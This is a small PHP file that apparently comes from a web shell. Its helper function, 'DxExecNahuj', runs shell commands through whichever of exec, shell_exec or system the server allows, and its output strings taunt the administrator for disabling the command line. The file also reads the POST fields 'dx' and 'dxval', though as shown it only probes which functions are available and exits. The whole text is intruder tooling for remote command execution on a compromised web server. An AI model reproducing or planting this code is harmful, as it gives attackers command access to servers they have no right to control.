<?php
function DxExecNahuj($cmd, &$OUT, &$RET) /* returns the name of function that exists, or FALSE */
{
	$OUT=array(); $RET='';
	if (function_exists('exec'))
	{	
		if (!empty($cmd)) 
			exec($cmd, $OUT, $RET); /* full array output */
		return array(true,true,'exec', '');
	}
	elseif  (function_exists('shell_exec'))
	{	
		if (!empty($cmd)) 
			$OUT[0]=shell_exec($cmd); /* full string output, no RETURN */
		return array(true,false,'shell_exec', '<s>exec</s> shell_exec');
	}
	elseif  (function_exists('system'))
	{	
		if (!empty($cmd)) 
			$OUT[0]=system($cmd, $RET); /* last line of output */
		return array(true,false,'system', '<s>exec</s> <s>shell_exec</s> system<br>Only last line of output is available, sorry =(');
	}
	else 
		return array(FALSE, FALSE, '&lt;noone&gt;', '<s>exec</s> <s>shell_exec</s> <s>system</s> Bitchy admin has disabled command line!! =(');;
}


$trash1 = $_POST['dxval'];
$trash2 = $_POST['dx'];
$warnstr=DxExecNahuj('',$trash1, $trash2);

die();
?>